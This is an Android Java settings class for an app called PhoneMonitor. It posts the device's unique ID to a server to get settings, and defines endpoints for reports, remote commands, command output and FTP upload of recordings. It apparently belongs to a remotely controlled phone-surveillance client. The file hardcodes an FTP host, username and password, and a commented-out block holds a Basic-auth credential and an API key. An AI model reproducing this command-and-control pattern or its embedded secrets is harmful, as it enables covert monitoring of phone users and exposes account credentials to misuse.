package com.monitor.phone.fkc.phonemonitor;

import android.content.Context;
import android.net.Uri;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

class AppSettings {

    //tries to read settings from server. if successful, updates local settings file and returns the required setting. if failed to read from server,
    //tries to read from local settings file and return the required setting. if failed, returns failsafe version of the required setting

    private static final String TAG = "phonemonitor";

    private Context context;

    private static final String settingsFileName = "phonemonitorsettings.json";
    private static final String settingServeur = "XXXXXXXXXXXXXXXX"; //ex: http://serveur.com

    private static final String getSettingsURL = settingServeur+"/getsettings.php";

    private static final String reportURL = settingServeur+"/report.php";
    private static final String commandsURL = settingServeur+"/getcommands.php";
    private static final String outputURL = settingServeur+"/setoutput.php";
    private static final String ftpServer = "ftp.cmax-ig.com";
    private static final int ftpPort = 22;
    private static final String ftpUsername = "cmaxhqpq";
    private static final String ftpPassword = "2018CMAXIG";

    private static final Boolean forceWifiOnForRecordUpload_failsafe = false;
    private static final int serverTalkInterval_failsafe = 1000;


    public AppSettings(Context context) {
        this.context = context;
    }

    public static String getTAG() {
        return TAG;
    }

    public static String getReportURL() {
        return reportURL;
    }

    public static String getCommandsURL() {
        return commandsURL;
    }

    public static String getOutputURL() {
        return outputURL;
    }

    public static String getFtpServer() {
        return ftpServer;
    }

    public static int getFtpPort() {
        return ftpPort;
    }

    public static String getFtpUsername() {
        return ftpUsername;
    }

    public static String getFtpPassword() {
        return ftpPassword;
    }

    public Boolean getForceWifiOnForRecordUpload() {
        Boolean retval = forceWifiOnForRecordUpload_failsafe;

        try {
            JSONObject settingsFromServer = readAndSaveSettingsFromServer();
            retval = settingsFromServer.getInt("ForceWifiOnForRecordUpload") == 1;
        } catch (Exception ex) {
//            Log.w(TAG, "Failed to read setting from server at AppSettings.getForceWifiOnForRecordUpload()\n" + ex.getMessage());
            try {
                JSONObject localSavedSettings = readSettingsFromLocalFile();
                retval = localSavedSettings.getInt("ForceWifiOnForRecordUpload") == 1;
            } catch (Exception ex_) {
//                Log.w(TAG, "Failed to read local setting at AppSettings.getForceWifiOnForRecordUpload()\n" + ex_.getMessage());
            }
        }

        return retval;
    }

    public int getServerTalkInterval() {
        int retval = serverTalkInterval_failsafe;

        try {
            JSONObject settingsFromServer = readAndSaveSettingsFromServer();
            retval = settingsFromServer.getInt("ServerTalkInterval");
        } catch (Exception ex) {
//            Log.w(TAG, "Failed to read setting from server at AppSettings.getServerTalkInterval()\n" + ex.getMessage());
            try {
                JSONObject localSavedSettings = readSettingsFromLocalFile();
                retval = localSavedSettings.getInt("ServerTalkInterval");
            } catch (Exception ex_) {
//                Log.w(TAG, "Failed to read local setting at AppSettings.getServerTalkInterval()\n" + ex_.getMessage());
            }
        }

        return retval;
    }

    private JSONObject readAndSaveSettingsFromServer() throws IOException, JSONException {
        JSONObject settings; String strSettings = "";
        URL url = new URL(getSettingsURL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setDoOutput(true);//we'll send the deviceUID to the server and we'll receive the corresponding settings
        httpURLConnection.setDoInput(true);
        httpURLConnection.setRequestProperty("User-Agent", "PhoneMonitor");
        httpURLConnection.setConnectTimeout(5000);
        httpURLConnection.setReadTimeout(5000);

        Uri.Builder builder = new Uri.Builder()
                .appendQueryParameter("uniqueid", HelperMethods.getDeviceUID(context));
        String GETQuery = builder.build().getEncodedQuery();

        OutputStream outputStream = httpURLConnection.getOutputStream();
        outputStream.write((byte[]) GETQuery.getBytes("UTF-8"));
        InputStream inputStream = httpURLConnection.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte byteread;
        while ((byteread = (byte) inputStream.read()) != -1) {
            byteArrayOutputStream.write(byteread);
        }
        strSettings = byteArrayOutputStream.toString();
        outputStream.close();
        inputStream.close();
        httpURLConnection.disconnect();
        if(strSettings.isEmpty() || strSettings == null){
            strSettings = "VIDE FKC";
            settings = new JSONObject();
        }else {
            settings = new JSONObject(strSettings);
        }
//        Log.wtf("FKC","RETOUR : "+strSettings);

        //save to local file
        String settingsPath = context.getFilesDir().getAbsolutePath() + "/" + settingsFileName;
        File settingsfile = new File(settingsPath);
        if (settingsfile.exists()) settingsfile.delete();
        FileOutputStream fileOutputStream = new FileOutputStream(settingsfile);
        fileOutputStream.write(settings.toString().getBytes());
        fileOutputStream.close();


        return settings;
    }

    private JSONObject readSettingsFromLocalFile() throws IOException, JSONException {
        JSONObject retval;

        String settingsPath = context.getFilesDir().getAbsolutePath() + "/" + settingsFileName;
        FileInputStream fileInputStream = new FileInputStream(settingsPath);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte byteread;
        while ((byteread = (byte) fileInputStream.read()) != -1) {
            byteArrayOutputStream.write(byteread);
        }
        retval = new JSONObject(byteArrayOutputStream.toString());
        byteArrayOutputStream.close();
        fileInputStream.close();
        return retval;
    }

/*    private static String makeHttpRequest(String url_link, String methode,  List<NameValuePair> params){
        String getData = "";
        JSONObject postData = new JSONObject();
        try {
            if (!methode.equals("POST")) {
                for (NameValuePair nvp : params) {
                    if (getData.length() != 0) getData += "&";
                    getData += URLEncoder.encode(nvp.getName(), "UTF-8");
                    getData += "=";
                    getData += URLEncoder.encode(nvp.getValue(), "UTF-8");
                }
            }else{
                for (NameValuePair nvp : params) {
                    postData.put(nvp.getName(),nvp.getValue());
                }
            }

            URL url = new URL(url_link);

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            String userCredentials = "237678132183:fkc";
            String basicAuth = "Basic " + new String(Base64.encodeToString(userCredentials.getBytes("UTF-8"), Base64.DEFAULT));

            conn.setRequestProperty("User-Agent", "PhoneMonitor");
            conn.setRequestProperty("Authorization", basicAuth);
            conn.setRequestProperty("X-API-KEY", "1234567890123456789012345678901234567890");
            conn.setRequestMethod(methode);
            if (methode.equals("POST")) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Length", String.valueOf(postData.toString().length()));
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                conn.getOutputStream().write(postData.toString().getBytes("UTF-8"));
            }
            int statusCode = conn.getResponseCode();
            Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));

            StringBuilder sb = new StringBuilder();
            for (int c; (c = in.read()) >= 0; )
                sb.append((char) c);
            String[] to_return = new String[2];
            to_return[0] = sb.toString();
            to_return[1] = "" + statusCode;
            return to_return[0];
        }catch (Exception e){}
        return null;
    }*/
}